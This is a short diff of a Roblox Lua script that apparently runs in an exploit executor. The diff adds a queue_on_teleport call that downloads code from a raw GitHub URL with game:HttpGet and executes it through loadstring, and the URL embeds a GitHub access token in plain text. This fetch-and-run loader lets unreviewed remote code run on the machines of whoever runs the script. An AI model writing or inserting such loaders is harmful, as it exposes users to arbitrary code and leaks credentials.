@@ -10,7 +10,7 @@ local Lobby = 12276235857
 --
 local function CopySlot()
     --
-    queue_on_teleport(String2)
+    queue_on_teleport([[loadstring(game:HttpGet("https://raw.githubusercontent.com/called333/test/refs/heads/main/%D0%B2%D1%8B%D0%BA%D1%83%D0%BF%D0%B0%D0%B9%D1%82%D0%B5%D0%B6%D0%B5%D1%81%D1%82%D0%BA%D1%83%D1%8E%D1%82%D0%B5%D0%BC%D1%83?token=GHSAT0AAAAAACYDU46TDF4IMRDYZMTIHXASZ3VJREQ"))()]])
     --
     Head:Destroy()
     Player.CharacterAdded:Once(function()
